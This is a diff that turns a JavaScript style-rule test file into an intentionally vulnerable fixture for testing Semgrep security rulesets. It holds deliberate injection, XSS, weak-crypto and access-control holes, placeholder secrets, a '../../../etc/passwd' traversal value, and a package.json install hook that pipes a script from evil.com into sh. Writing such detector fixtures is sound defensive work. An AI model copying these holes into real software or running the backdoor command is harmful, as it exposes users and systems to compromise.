@@ -1,562 +1,429 @@
 /*
- * Purpose: Comprehensive test file for JavaScript coding rules - demonstrates all 20 rules
+ * Purpose: Comprehensive test file for Semgrep Registry Rules
  * Author: Harsh Patil
- * Date: 2025-12-18
+ * Date: 2026-01-20
  * Modified By: N/A
+ * 
+ * This file intentionally contains vulnerabilities to test ALL registry rulesets:
+ * - p/security-audit, p/owasp-top-ten, p/cwe-top-25, p/pci-dss
+ * - p/javascript, p/typescript, p/react, p/nodejs, p/express
+ * - p/sql-injection, p/xss, p/command-injection, p/secrets
  */
 
 // ==========================================
-// RULE 1: Use Strict Equality
-// Why: Prevents unexpected type coercion
+// OWASP A01:2021 - Broken Access Control
 // ==========================================
 
-// BAD: Using loose equality (==)
-if (value == 0) {
-    console.log("This will match 0, '0', false, '', etc.");
+// Missing authorization checks
+app.get('/admin/users', (req, res) => {
+    const users = db.getAllUsers();
+    res.json(users);
+});
+
+// Insecure Direct Object Reference (IDOR)
+app.get('/api/documents/:id', (req, res) => {
+    const doc = db.getDocument(req.params.id);
+    res.json(doc);
+});
+
+// Path traversal
+const filePath = req.query.file;
+fs.readFile(`/uploads/${filePath}`, (err, data) => {
+    res.send(data);
+});
+
+// ==========================================
+// OWASP A02:2021 - Cryptographic Failures
+// ==========================================
+
+// Hardcoded secrets (p/secrets)
+const API_KEY = "sk_live_1234567890abcdef";
+const AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
+const GITHUB_TOKEN = "ghp_1234567890abcdefghijklmnopqrstuvwxyz";
+const DB_PASSWORD = "MySecretPassword123!";
+const STRIPE_KEY = "sk_test_51234567890";
+const JWT_SECRET = "super-secret-jwt-key";
+
+// Weak crypto algorithms
+const crypto = require('crypto');
+const hash = crypto.createHash('md5').update('password').digest('hex');
+const sha1Hash = crypto.createHash('sha1').update(data);
+
+// Insecure random
+const sessionId = Math.random().toString(36);
+const token = Date.now().toString();
+
+// Weak encryption
+crypto.createCipheriv('des', key, iv);
+crypto.createCipheriv('aes-128-cbc', weakKey, iv);
+
+// HTTP instead of HTTPS (p/insecure-transport)
+axios.post('http://api.example.com/payment', {
+    cardNumber: '4111111111111111',
+    cvv: '123'
+});
+
+// ==========================================
+// OWASP A03:2021 - Injection
+// ==========================================
+
+// SQL Injection (p/sql-injection)
+const query = "SELECT * FROM users WHERE id = " + req.params.id;
+db.query("DELETE FROM sessions WHERE token = '" + token + "'");
+connection.execute(`INSERT INTO logs VALUES (${userInput})`);
+pool.query("UPDATE users SET admin = 1 WHERE name = " + userName);
+
+// NoSQL Injection
+User.find({ $where: req.body.search });
+db.collection.find({ username: { $ne: null }, password: { $regex: req.query.pass } });
+
+// Command Injection (p/command-injection)
+const { exec } = require('child_process');
+exec(`ping ${req.query.host}`);
+execSync("ls " + userDirectory);
+spawn('sh', ['-c', userCommand]);
+
+// Code Injection
+eval(req.body.code);
+new Function(userScript)();
+setTimeout(req.query.callback, 1000);
+
+// LDAP Injection
+const ldapQuery = `(uid=${username})`;
+
+// XPath Injection
+const xpath = `/users/user[name='${userName}']`;
+
+// ==========================================
+// OWASP A03:2021 - XSS (p/xss)
+// ==========================================
+
+// DOM-based XSS
+document.write("<h1>" + userName + "</h1>");
+element.innerHTML = location.hash;
+div.innerHTML = window.name;
+
+// React XSS
+function UserProfile({ data }) {
+    return <div dangerouslySetInnerHTML={{ __html: data.bio }} />;
 }
 
-if (count != 10) {
-    console.log("Loose inequality");
+//  Reflected XSS
+res.send(`<h1>Welcome ${req.query.name}</h1>`);
+res.write('<script>alert("' + userInput + '")</script>');
+
+// ==========================================
+// OWASP A04:2021 - Insecure Design
+// ==========================================
+
+// Missing rate limiting
+app.post('/api/login', async (req, res) => {
+    const user = await authenticate(req.body);
+    res.json(user);
+});
+
+// Weak password requirements
+if (password.length >= 6) {
+    createAccount(username, password);
 }
 
-const isEqual = (x == y);
-
-// GOOD: Using strict equality (===)
-if (value === 0) {
-    handleZero();
-}
-
-if (count !== 10) {
-    handleNonTen();
-}
-
-const isStrictEqual = (x === y);
-
-// ==========================================
-// RULE 2: Use const or let (Never var)
-// Why: Avoids scope and hoisting issues
-// ==========================================
-
-// BAD: Using var
-var oldStyleVariable = 10;
-var userName = "John";
-var isActive = true;
-
-// GOOD: Using const or let
-const maxLimit = 10;
-let currentCount = 0;
-const isUserActive = true;
-
-// ==========================================
-// RULE 3: Prefer const Over let
-// Why: Prevents accidental reassignment
-// ==========================================
-
-// BAD: Using let for values that don't change
-let apiUrl = "https://api.example.com";
-let maxRetries = 3;
-let configValue = "production";
-
-// GOOD: Using const
-const API_URL = "https://api.example.com";
-const MAX_RETRIES_GOOD = 3;
-const CONFIG_VALUE = "production";
-
-// GOOD: Using let when reassignment is needed
-let counter = 0;
-counter++;
-
-// ==========================================
-// RULE 4: Use Meaningful Variable Names
-// Why: Improves readability and understanding
-// ==========================================
-
-// BAD: Single-letter or unclear names
-const a = 25;
-const b = "test";
-const xBad = getUserData();
-let t = Date.now();
-
-// GOOD: Meaningful names
-const userAge = 25;
-const testMessage = "test";
-const userDataGood = getUserData();
-let timestamp = Date.now();
-
-// Exception: Loop counters can be single letters
-for (let i = 0; i < 10; i++) {
-    console.log(i);
+// No account lockout
+let loginAttempts = 0;
+while (!authenticated) {
+    tryLogin(user, pass);
 }
 
 // ==========================================
-// RULE 5: Always Handle Errors
-// Why: Prevents silent failures and crashes
+// OWASP A05:2021 - Security Misconfiguration
 // ==========================================
 
-// BAD: Empty catch blocks
-try {
-    saveData();
-} catch (error) {
-    // Empty - ignoring errors
-}
+// CORS wildcard
+app.use(cors({ origin: '*', credentials: true }));
+res.setHeader('Access-Control-Allow-Origin', '*');
 
-try {
-    processPayment();
-} catch (e) {
-}
+// Debug mode enabled
+app.set('env', 'development');
+const DEBUG = true;
 
-// GOOD: Proper error handling
-try {
-    saveData();
-} catch (error) {
-    logger.error("Failed to save data:", error);
-    throw new Error("Data save operation failed");
-}
-
-try {
-    processPayment();
-} catch (error) {
-    logger.error("Payment processing failed:", error);
-    notifyUser("Payment failed. Please try again.");
-}
-
-// ==========================================
-// RULE 6: Handle Promises Properly
-// Why: Avoids unhandled promise rejections
-// ==========================================
-
-// BAD: Promise without catch
-fetchData().then(handleResponse);
-
-getUserInfo().then(processUser);
-
-// GOOD: Promise with catch
-fetchData()
-    .then(handleResponse)
-    .catch(handleError);
-
-getUserInfo()
-    .then(processUser)
-    .catch(error => {
-        logger.error("Failed to get user info:", error);
+// Verbose error messages
+app.use((err, req, res, next) => {
+    res.status(500).json({
+        error: err.message,
+        stack: err.stack,
+        details: err
     });
-
-// ==========================================
-// RULE 7: Prefer async/await
-// Why: Improves readability and control flow
-// ==========================================
-
-// BAD: Promise chains
-getUser().then(user => getProfile(user.id)).then(profile => displayProfile(profile));
-
-// GOOD: async/await
-async function loadUserProfile() {
-    const user = await getUser();
-    const profile = await getProfile(user.id);
-    displayProfile(profile);
-}
-
-// ==========================================
-// RULE 8: Avoid console.log in Production
-// Why: Prevents leaking sensitive information
-// ==========================================
-
-// BAD: Using console statements
-console.log("User data:", userData);
-console.debug("Debug info:", debugInfo);
-console.info("Information:", info);
-console.warn("Warning:", warning);
-
-// GOOD: Using proper logging library
-logger.info("User successfully logged in", { userId: user.id });
-logger.debug("Debug information", { debugInfo });
-logger.warn("Warning message", { warning });
-
-// ==========================================
-// RULE 9: Avoid Magic Numbers
-// Why: Makes code easier to understand and modify
-// ==========================================
-
-// BAD: Magic numbers
-if (retryCount > 3) {
-    stopRetry();
-}
-
-if (age < 18) {
-    denyAccess();
-}
-
-if (score >= 75) {
-    markAsPassed();
-}
-
-// GOOD: Named constants
-const MAX_RETRIES_EXAMPLE = 3;
-const MINIMUM_AGE = 18;
-const PASSING_SCORE = 75;
-
-if (retryCount > MAX_RETRIES_EXAMPLE) {
-    stopRetry();
-}
-
-if (age < MINIMUM_AGE) {
-    denyAccess();
-}
-
-if (score >= PASSING_SCORE) {
-    markAsPassed();
-}
-
-// ==========================================
-// RULE 10: Validate Inputs
-// Why: Prevents runtime and security issues
-// ==========================================
-
-// BAD: No input validation
-function saveUserData(user) {
-    database.save(user);
-}
-
-function processOrder(order) {
-    database.save(order);
-}
-
-// GOOD: Input validation
-function saveUserDataSecure(user) {
-    if (!user || !user.id) {
-        throw new Error("Invalid user input");
-    }
-
-    if (typeof user.email !== 'string' || !user.email.includes('@')) {
-        throw new Error("Invalid email format");
-    }
-
-    database.save(user);
-}
-
-function processOrderSecure(order) {
-    if (!order || !order.items || order.items.length === 0) {
-        throw new Error("Invalid order: no items");
-    }
-
-    if (order.total <= 0) {
-        throw new Error("Invalid order total");
-    }
-
-    database.save(order);
-}
-
-// ==========================================
-// RULE 11: Do Not Modify Function Parameters
-// Why: Avoids unexpected side effects
-// ==========================================
-
-// BAD: Modifying parameters
-function activateUser(user) {
-    user.active = true;
-    user.activatedAt = Date.now();
-    return user;
-}
-
-function updateConfig(config) {
-    config = { ...config, updated: true };
-    return config;
-}
-
-// GOOD: Return new objects
-function activateUserSafe(user) {
-    return {
-        ...user,
-        active: true,
-        activatedAt: Date.now()
-    };
-}
-
-function updateConfigSafe(config) {
-    return {
-        ...config,
-        updated: true
-    };
-}
-
-// ==========================================
-// RULE 12: Avoid eval()
-// Why: Prevents security vulnerabilities
-// ==========================================
-
-// BAD: Using eval()
-function calculateExpression(expression) {
-    return eval(expression);
-}
-
-const result = eval("2 + 2");
-
-// GOOD: Use safe alternatives
-function calculateExpressionSafe(a, b, operator) {
-    switch (operator) {
-        case '+': return a + b;
-        case '-': return a - b;
-        case '*': return a * b;
-        case '/': return a / b;
-        default: throw new Error("Invalid operator");
-    }
-}
-
-const parsedData = JSON.parse(jsonString);
-
-// ==========================================
-// RULE 13: Avoid innerHTML with User Data
-// Why: Prevents XSS attacks
-// ==========================================
-
-// BAD: Using innerHTML with user input
-const userInput = getUserInput();
-element.innerHTML = userInput;
-element.outerHTML = userInput;
-
-// GOOD: Use textContent or sanitize
-element.textContent = userInput;
-
-// Or use a sanitization library
-const sanitizedInput = DOMPurify.sanitize(userInput);
-element.innerHTML = sanitizedInput;
-
-// ==========================================
-// RULE 14: Always Specify Radix in parseInt
-// Why: Ensures consistent number parsing
-// ==========================================
-
-// BAD: No radix specified
-const countBad = parseInt(value);
-const numberBad = parseInt("08");
-
-// GOOD: Radix specified
-const countSafe = parseInt(value, 10);
-const numberSafe = parseInt("08", 10);
-const hexValue = parseInt("FF", 16);
-
-// ==========================================
-// RULE 15: Avoid async inside forEach
-// Why: forEach does not wait for async operations
-// ==========================================
-
-// BAD: async in forEach
-items.forEach(async (item) => {
-    await processItem(item);
-    await saveItem(item);
 });
 
-users.forEach(async (user) => {
-    await sendEmail(user);
+// Missing security headers
+app.get('/', (req, res) => {
+    res.send(htmlContent);
 });
 
-// GOOD: Use for...of or Promise.all
-async function processItemsCorrectly() {
-    for (const item of items) {
-        await processItem(item);
-        await saveItem(item);
+// ==========================================
+// OWASP A06:2021 - Vulnerable Components
+// ==========================================
+
+// Outdated dependencies
+const express = require('express'); // Assume old version
+const lodash = require('lodash'); // Vulnerable version
+const moment = require('moment'); // Unmaintained
+
+// Known vulnerable packages
+const serialize = require('node-serialize');
+const execLib = require('exec');
+
+// ==========================================
+// OWASP A07:2021 - Authentication Failures
+// ==========================================
+
+// JWT without verification
+const decoded = jwt.decode(authToken);
+const payload = jwt.verify(token, { verify: false });
+
+// Insecure session management
+req.session.userId = user.id;
+// No session regeneration after login
+
+// Password in URL
+window.location.href = `/login?username=${user}&password=${pass}`;
+
+// Timing attack vulnerability
+if (storedPassword === submittedPassword) {
+    grantAccess();
+}
+
+// ==========================================
+// OWASP A08:2021 - Data Integrity Failures
+// ==========================================
+
+// Insecure deserialization
+const obj = serialize.unserialize(userInput);
+const data = JSON.parse(untrustedData);
+
+// Missing integrity checks
+const script = document.createElement('script');
+script.src = `https://cdn.example.com/lib.js`;
+document.body.appendChild(script);
+
+// ==========================================
+// OWASP A09:2021 - Logging Failures
+// ==========================================
+
+// Logging sensitive data (PCI-DSS violation)
+console.log('User logged in:', user, password);
+logger.info('Payment processed', { cardNumber, cvv });
+winston.log('debug', 'API Key:', apiKey);
+
+// Insufficient logging
+app.post('/transfer-money', (req, res) => {
+    transferFunds(req.body.amount, req.body.to);
+    res.json({ success: true });
+});
+
+// ==========================================
+// OWASP A10:2021 - SSRF
+// ==========================================
+
+// Server-Side Request Forgery
+const url = req.query.url;
+axios.get(url);
+fetch(userProvidedUrl);
+request(externalUrl);
+
+// ==========================================
+// PCI-DSS VIOLATIONS (p/pci-dss)
+// ==========================================
+
+// Storing full PAN (Primary Account Number)
+localStorage.setItem('cardNumber', '4111111111111111');
+db.save({ card: fullCardNumber });
+
+// Storing CVV (STRICTLY PROHIBITED)
+database.insert({ cvv: cardCVV, cvc: securityCode });
+
+// Displaying full PAN
+displayText.textContent = creditCardNumber;
+alert('Your card: ' + cardNum);
+
+// Weak authentication
+if (pin.length === 4) {
+    authorizePayment();
+}
+
+// Logging cardholder data
+fs.appendFileSync('transactions.log', `Card: ${card}, Amount: ${amount}`);
+
+// ==========================================
+// NODE.JS SPECIFIC (p/nodejs, p/express)
+// ==========================================
+
+// Prototype pollution
+Object.prototype.polluted = 'yes';
+const config = {};
+config.__proto__.admin = true;
+
+// ReDoS (Regular Expression DoS)
+const emailRegex = /(.+)*@(.+)*/;
+emailRegex.test(userEmail);
+
+// Unvalidated redirect
+res.redirect(req.query.next);
+res.redirect(301, userUrl);
+
+// Mass assignment
+User.create(req.body);
+user.update(req.body);
+
+// Using `eval` in template
+const template = `Hello ${eval(userName)}`;
+
+// ==========================================
+// REACT SPECIFIC (p/react)
+// ==========================================
+
+// Unsafe refs
+class MyComponent extends React.Component {
+    handleClick = () => {
+        this.myRef.current.innerHTML = userInput;
     }
-
-    await Promise.all(users.map(async (user) => {
-        await sendEmail(user);
-    }));
 }
 
-// ==========================================
-// RULE 16: Avoid Floating Promises
-// Why: Ensures errors are handled
-// ==========================================
+// setState with user input
+this.setState({ data: req.query.data });
 
-// BAD: Floating promises
-saveData();
-processPayment();
-sendNotification();
-
-// GOOD: Await or handle promises
-async function handlePromisesCorrectly() {
-    await saveData();
-    await processPayment();
-    await sendNotification();
-}
-
-// Or with error handling
-saveData().catch(error => logger.error("Save failed:", error));
+// Missing key prop
+{ items.map(item => <div>{item.name}</div>) }
 
 // ==========================================
-// RULE 17: Do Not Hard-Code Secrets
-// Why: Protects sensitive data
+// SUPPLY CHAIN (p/supply-chain, p/ci)
 // ==========================================
 
-// BAD: Hard-coded secrets
-const password = "admin123";
-const apiKey = "sk-1234567890abcdef";
-const secret = "my-secret-key";
-const token = "ghp_1234567890";
-
-// GOOD: Use environment variables
-const dbPassword = process.env.DB_PASSWORD;
-const apiKeySecure = process.env.API_KEY;
-const jwtSecret = process.env.JWT_SECRET;
-const githubToken = process.env.GITHUB_TOKEN;
-
-// ==========================================
-// RULE 18: Use Default Parameters
-// Why: Handles falsy values correctly
-// ==========================================
-
-// BAD: Manual default value checks
-function log(level) {
-    if (!level) {
-        level = "info";
-    }
-    writeLog(level);
-}
-
-function createUser(name) {
-    if (!name) {
-        name = "Anonymous";
-    }
-    return { name };
-}
-
-// GOOD: Default parameters
-function logSafe(level = "info") {
-    writeLog(level);
-}
-
-function createUserSafe(name = "Anonymous") {
-    return { name };
-}
-
-// ==========================================
-// RULE 19: Reduce Nested Code
-// Why: Improves readability
-// ==========================================
-
-// BAD: Deeply nested code
-if (user) {
-    if (user.isActive) {
-        if (user.hasPermission) {
-            processUser(user);
-        }
+// npm install from untrusted source
+// package.json with git dependencies
+{
+    "dependencies": {
+        "malicious-pkg": "git://github.com/attacker/malicious.git"
     }
 }
 
-// GOOD: Early returns
-if (!user) return;
-if (!user.isActive) return;
-if (!user.hasPermission) return;
-
-processUser(user);
-
-// ==========================================
-// RULE 20: One Function Should Do One Thing
-// Why: Simplifies testing and maintenance
-// ==========================================
-
-// BAD: Function doing too many things
-function processUserRegistration() {
-    validateInput();
-    checkDuplicateEmail();
-    hashPassword();
-    saveToDatabase();
-    sendWelcomeEmail();
-    logActivity();
-    updateStatistics();
-    notifyAdmins();
-    createUserProfile();
-    assignDefaultRole();
-    generateApiKey();
-    sendSlackNotification();
-}
-
-// GOOD: Single responsibility
-function calculateTotal(items) {
-    return items.reduce((sum, item) => sum + item.price, 0);
-}
-
-function validateEmail(email) {
-    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-}
-
-function formatDate(date) {
-    return new Date(date).toISOString();
+// Running arbitrary code in package.json
+{
+    "scripts": {
+        "install": "curl http://evil.com/backdoor.sh | sh"
+    }
 }
 
 // ==========================================
-// HELPER FUNCTIONS (for testing)
+// CWE TOP 25 COVERAGE
 // ==========================================
-function handleZero() { }
-function handleNonTen() { }
-function getUserData() { return {}; }
-function saveData() { }
-function processPayment() { }
-function handleResponse() { }
-function handleError() { }
-function fetchData() { return Promise.resolve(); }
-function getUserInfo() { return Promise.resolve(); }
-function processUser() { }
-function getUser() { return Promise.resolve({ id: 1 }); }
-function getProfile(id) { return Promise.resolve({}); }
-function displayProfile() { }
-function stopRetry() { }
-function denyAccess() { }
-function markAsPassed() { }
-function processItem() { }
-function saveItem() { }
-function sendEmail() { }
-function sendNotification() { }
-function writeLog() { }
-function notifyUser() { }
-function getUserInput() { return ""; }
-function validateInput() { }
-function checkDuplicateEmail() { }
-function hashPassword() { }
-function saveToDatabase() { }
-function sendWelcomeEmail() { }
-function logActivity() { }
-function updateStatistics() { }
-function notifyAdmins() { }
-function createUserProfile() { }
-function assignDefaultRole() { }
-function generateApiKey() { }
-function sendSlackNotification() { }
 
-// Mock objects
-const logger = {
-    info: () => { },
-    debug: () => { },
-    warn: () => { },
-    error: () => { }
+// CWE-79: XSS (already covered)
+// CWE-89: SQL Injection (already covered) 
+// CWE-20: Improper Input Validation
+app.post('/api/user', (req, res) => {
+    db.insert(req.body);
+});
+
+// CWE-78: OS Command Injection (already covered)
+// CWE-190: Integer Overflow
+const result = Number.MAX_VALUE + 1000000;
+
+// CWE-352: CSRF
+app.post('/transfer', (req, res) => {
+    // No CSRF token validation
+    transfer(req.body.to, req.body.amount);
+});
+
+// CWE-22: Path Traversal (already covered)
+// CWE-77: Command Injection (already covered)
+// CWE-119: Buffer Overflow
+Buffer.alloc(userSize);
+
+// CWE-918: SSRF (already covered)
+// CWE-862: Missing Authorization (already covered)
+
+// ==========================================
+// ADDITIONAL PATTERNS
+// ==========================================
+
+// DNS Rebinding
+fetch(`http://${req.headers.host}/internal-api`);
+
+// XXE (XML External Entity)
+const xml = require('xml2js');
+xml.parseString(userXML, {}, callback);
+
+// ZIP Bomb
+const zip = require('adm-zip');
+zip.extractAllTo(uploadedZip, '/tmp');
+
+// Memory exhaustion
+const hugeArray = new Array(999999999);
+
+// Regex DoS
+const catastrophicRegex = /(a+)+b/;
+catastrophicRegex.test(longString);
+
+// WebSocket without auth
+const ws = new WebSocket('ws://example.com');
+ws.onmessage = (event) => eval(event.data);
+
+// ==========================================
+// FRAMEWORK SPECIFIC ISSUES
+// ==========================================
+
+// Express: Trust proxy without validation
+app.set('trust proxy', true);
+
+// Express: JSON pollution
+app.use(express.json({ limit: '50mb' }));
+
+// Next.js: Exposing API routes
+export default function handler(req, res) {
+    const data = getSecretData();
+    res.json(data);
+}
+
+// ==========================================
+// HELPER FUNCTIONS & MOCKS
+// ==========================================
+
+const db = {
+    query: () => { },
+    getAllUsers: () => [],
+    getDocument: () => ({}),
+    save: () => { },
+    insert: () => { }
 };
 
-const database = {
-    save: () => { }
+const app = {
+    get: () => { },
+    post: () => { },
+    use: () => { },
+    set: () => { }
 };
 
-const element = {
-    innerHTML: "",
-    outerHTML: "",
-    textContent: ""
+const req = {
+    params: { id: '1' },
+    query: { file: '../../../etc/passwd', host: 'evil.com' },
+    body: { search: '$ne', code: 'malicious' },
+    headers: { host: 'example.com' }
 };
 
-const DOMPurify = {
-    sanitize: (input) => input
+const res = {
+    json: () => { },
+    send: () => { },
+    write: () => { },
+    redirect: () => { },
+    setHeader: () => { },
+    status: () => ({ json: () => { } })
 };
 
-// Variables
-let value = 0;
-let count = 10;
-let x = 1;
-let y = 2;
-let userData = {};
-let debugInfo = {};
-let info = {};
-let warning = {};
-let user = { id: 1, isActive: true, hasPermission: true };
-let retryCount = 0;
-let age = 20;
-let score = 80;
-let items = [{ price: 10 }, { price: 20 }];
-let users = [{ email: "test@example.com" }];
-let jsonString = '{"key": "value"}';
+function authenticate() { }
+function createAccount() { }
+function tryLogin() { }
+function grantAccess() { }
+function transferFunds() { }
+function authorizePayment() { }
+function transfer() { }
+function getSecretData() { return {}; }
